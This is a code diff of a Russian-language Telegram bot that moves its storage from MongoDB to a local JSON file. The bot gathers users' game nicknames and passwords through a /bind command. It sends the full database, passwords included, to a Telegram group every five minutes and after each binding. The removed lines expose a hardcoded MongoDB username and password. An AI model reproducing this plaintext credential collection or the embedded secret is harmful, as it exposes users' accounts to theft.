@@ -10,7 +10,6 @@ import psutil
 from aiogram import BaseMiddleware, Bot, Dispatcher, types, F
 from aiogram.exceptions import TelegramRetryAfter
 from aiogram.filters import Command
-from pymongo import MongoClient
 
 # ==========================================
 # ВЕБ-СЕРВЕР ДЛЯ RENDER И UPTIMEROBOT
@@ -32,29 +31,24 @@ def run_health_check_server():
 threading.Thread(target=run_health_check_server, daemon=True).start()
 
 # ==========================================
-# ОСНОВНЫЕ НАСТРОЙКИ И СОХРАНЕНИЕ В MONGODB
+# ОСНОВНЫЕ НАСТРОЙКИ
 # ==========================================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MAIN_ADMIN_ID = 8070071877  # Главный админ
-BACKUP_GROUP_ID = -1004497972901  # ID группы для бэкапов
-
-MONGO_URI = "mongodb+srv://botuser:Zona12345@cluster0.bbydzbw.mongodb.net/?retryWrites=true&w=majority"
+BACKUP_GROUP_ID = -1004497972901  # Группа для бэкапов
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-client = MongoClient(MONGO_URI)
-db_collection = client.bot_database.bot_data
+LOCAL_DB_FILE = "bot_data.json"
 
 def load_data():
-    try:
-        data = db_collection.find_one({"_id": "bot_storage"})
-        if data:
-            data.pop("_id", None)
-            return data
-    except Exception as e:
-        print(f"Ошибка загрузки БД: {e}")
-
+    if os.path.exists(LOCAL_DB_FILE):
+        try:
+            with open(LOCAL_DB_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception as e:
+            print(f"Ошибка чтения локальной базы: {e}")
     return {
         "admins": [MAIN_ADMIN_ID],
         "banned_users": {},
@@ -63,11 +57,10 @@ def load_data():
 
 def save_data():
     try:
-        save_obj = db.copy()
-        save_obj["_id"] = "bot_storage"
-        db_collection.replace_one({"_id": "bot_storage"}, save_obj, upsert=True)
+        with open(LOCAL_DB_FILE, "w", encoding="utf-8") as f:
+            json.dump(db, f, ensure_ascii=False, indent=4)
     except Exception as e:
-        print(f"Ошибка сохранения в БД: {e}")
+        print(f"Ошибка сохранения локальной базы: {e}")
 
 db = load_data()
 
@@ -81,41 +74,35 @@ chat_history = {}
 active_spam_tasks = {}
 
 # ==========================================
-# АВТОМАТИЧЕСКИЙ БЭКАП В ГРУППУ
+# О Т П Р А В К А   Б Э К А П А
 # ==========================================
+async def send_backup_to_group():
+    try:
+        accounts = db.get("accounts_db", {})
+        has_accounts = any(len(acc_list) > 0 for acc_list in accounts.values())
+
+        if has_accounts:
+            filename = "database_backup.json"
+            with open(filename, "w", encoding="utf-8") as f:
+                json.dump(db, f, ensure_ascii=False, indent=4)
+
+            backup_file = types.FSInputFile(filename)
+            await bot.send_document(
+                chat_id=BACKUP_GROUP_ID,
+                document=backup_file,
+                caption="[Авто-бэкап базы данных]",
+                disable_notification=True
+            )
+
+            if os.path.exists(filename):
+                os.remove(filename)
+    except Exception as e:
+        print(f"Ошибка отправки бэкапа в группу: {e}")
+
 async def auto_backup_task():
-    """
-    Фоновая задача: делает бэкап сразу при запуске, а затем каждые 5 минут.
-    Отправляет файл только в том случае, если в базе есть привязанные аккаунты.
-    """
     while True:
-        try:
-            accounts = db.get("accounts_db", {})
-            has_accounts = any(len(acc_list) > 0 for acc_list in accounts.values())
-
-            if has_accounts:
-                filename = "database_backup.json"
-                with open(filename, "w", encoding="utf-8") as f:
-                    json.dump(db, f, ensure_ascii=False, indent=4)
-
-                backup_file = types.FSInputFile(filename)
-                await bot.send_document(
-                    chat_id=BACKUP_GROUP_ID,
-                    document=backup_file,
-                    caption="📦 **Авто-бэкап базы данных**",
-                    disable_notification=True
-                )
-
-                if os.path.exists(filename):
-                    os.remove(filename)
-            else:
-                print("[Бэкап] В базе пока нет аккаунтов, отправка пропущена.")
-
-        except Exception as e:
-            print(f"Ошибка отправки авто-бэкапа в группу: {e}")
-
-        # Задержка 5 минут до следующей проверки
         await asyncio.sleep(300)
+        await send_backup_to_group()
 
 # ==========================================
 # ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И MIDDLEWARE
@@ -170,24 +157,17 @@ class BanMiddleware(BaseMiddleware):
 dp.message.middleware(BanMiddleware())
 
 # ==========================================
-# ИМПОРТ И ЭКСПОРТ БАЗЫ ДАННЫХ ФАЙЛОМ
+# ПОЛЬЗОВАТЕЛЬСКИЕ КОМАНДЫ И БД
 # ==========================================
 @dp.message(Command("getdb"))
 async def getdb_handler(message: types.Message):
     if not is_admin(message.from_user.id):
         return
-
     filename = "database.json"
     with open(filename, "w", encoding="utf-8") as f:
         json.dump(db, f, ensure_ascii=False, indent=4)
-
     db_file = types.FSInputFile(filename)
-    await bot.send_document(
-        chat_id=message.chat.id,
-        document=db_file,
-        caption="📦 Файл текущей базы данных."
-    )
-
+    await bot.send_document(chat_id=message.chat.id, document=db_file, caption="[БД] Текущий файл базы данных.")
     if os.path.exists(filename):
         os.remove(filename)
 
@@ -195,46 +175,29 @@ async def getdb_handler(message: types.Message):
 async def restore_db_handler(message: types.Message):
     if not is_admin(message.from_user.id):
         return
-
     document = message.document
     if not document.file_name.endswith(".json"):
         return
-
     file_path = f"downloaded_{document.file_name}"
-
     try:
         file = await bot.get_file(document.file_id)
         await bot.download_file(file.file_path, file_path)
-
         with open(file_path, "r", encoding="utf-8") as f:
             imported_data = json.load(f)
-
         if isinstance(imported_data, dict) and "accounts_db" in imported_data:
             global db
             db.clear()
             db.update(imported_data)
             save_data()
-
-            await bot.send_message(
-                message.chat.id,
-                "✅ [БД] База данных успешно принята, обновлена и сохранена!"
-            )
+            await bot.send_message(message.chat.id, "[БД] База данных успешно восстановлена!")
         else:
-            await bot.send_message(
-                message.chat.id,
-                "❌ [БД] Ошибка: Неверный формат файла базы данных."
-            )
-
+            await bot.send_message(message.chat.id, "[БД] Ошибка: Неверный формат файла базы данных.")
     except Exception as e:
-        await bot.send_message(message.chat.id, f"❌ [БД] Ошибка восстановления: {e}")
-
+        await bot.send_message(message.chat.id, f"[БД] Ошибка восстановления: {e}")
     finally:
         if os.path.exists(file_path):
             os.remove(file_path)
 
-# ==========================================
-# ПОЛЬЗОВАТЕЛЬСКИЕ КОМАНДЫ
-# ==========================================
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
     welcome_text = (
@@ -303,7 +266,7 @@ async def bind_handler(message: types.Message):
 
     tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
     admin_msg = (
-        f"🔔 Новый привязанный аккаунт:\n\n"
+        f"[Уведомление] Новый привязанный аккаунт:\n\n"
         f"Игрок: {tg_user}\n"
         f"Telegram ID: {user_id}\n"
         f"Ник: {username}\n"
@@ -315,6 +278,8 @@ async def bind_handler(message: types.Message):
             await bot.send_message(chat_id=admin_id, text=admin_msg)
         except Exception as e:
             print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
+
+    await send_backup_to_group()
 
 @dp.message(Command("list"))
 async def list_handler(message: types.Message):
@@ -345,9 +310,8 @@ async def report_handler(message: types.Message):
         await send_tracked_message(message.chat.id, "[Система] Ваша жалоба отправлена.")
     except Exception:
         await send_tracked_message(message.chat.id, "[Система] Ошибка при отправке.")
-
-# ==========================================
-# АДМИН-КОМАНДЫ
+                               # ==========================================
+# АДМИН-КОМАНДЫ И ЗАПУСК
 # ==========================================
 @dp.message(Command("antispam"))
 async def antispam_handler(message: types.Message):
@@ -368,11 +332,11 @@ async def helpadmin_handler(message: types.Message):
 
     text = (
         "[ПАНЕЛЬ АДМИНИСТРАТОРА]\n\n"
-        "📌 Пользовательские:\n"
+        "Пользовательские:\n"
         "/bind [Ник] [Пароль]\n"
         "/list\n"
         "/report [текст]\n\n"
-        "🛡 Админские:\n"
+        "Админские:\n"
         "/getdb - Скачать текущий файл базы (.json)\n"
         "(Отправь .json файл боту для восстановления базы)\n"
         "/op [ID] - Выдать админку\n"
@@ -579,4 +543,71 @@ async def msg_handler(message: types.Message):
     if len(args) < 3:
         return
     target_id = int(args[1])
-    te
+    text = args[2]
+    try:
+        await send_tracked_message(target_id, f"[Ответ от администрации]\n{text}")
+        await bot.send_message(message.chat.id, "[Система] Сообщение отправлено.")
+    except Exception:
+        await bot.send_message(message.chat.id, "[Система] Ошибка отправки.")
+
+@dp.message(Command("dellist"))
+async def dellist_handler(message: types.Message):
+    if not is_admin(message.from_user.id):
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        return
+    target_nick = args[1]
+    found = False
+    for uid, accs in db["accounts_db"].items():
+        for acc in accs[:]:
+            if acc["nick"].lower() == target_nick.lower():
+                accs.remove(acc)
+                found = True
+
+    if found:
+        save_data()
+        await bot.send_message(message.chat.id, f"[Система] Аккаунт {target_nick} удален из базы.")
+    else:
+        await bot.send_message(message.chat.id, "[Система] Ник не найден.")
+
+@dp.message(Command("clear"))
+async def clear_handler(message: types.Message):
+    if not is_admin(message.from_user.id):
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        return
+    target_id = int(args[1])
+    if target_id in bot_messages and bot_messages[target_id]:
+        deleted_count = 0
+        for msg_id in bot_messages[target_id]:
+            try:
+                await bot.delete_message(chat_id=target_id, message_id=msg_id)
+                deleted_count += 1
+            except Exception:
+                pass
+        bot_messages[target_id].clear()
+        await bot.send_message(message.chat.id, f"[Система] Удалено {deleted_count} сообщений у {target_id}.")
+
+# ==========================================
+# ЗАПУСК БОТА И ФОНОВЫХ ЗАДАЧ
+# ==========================================
+async def main():
+    await bot.delete_webhook(drop_pending_updates=True)
+
+    try:
+        await bot.send_message(
+            chat_id=BACKUP_GROUP_ID,
+            text="[Система] Бот успешно запущен и привязан к группе бэкапов!"
+        )
+    except Exception as e:
+        print(f"Ошибка отправки сообщений в группу бэкапов: {e}")
+
+    await send_backup_to_group()
+    asyncio.create_task(auto_backup_task())
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+    
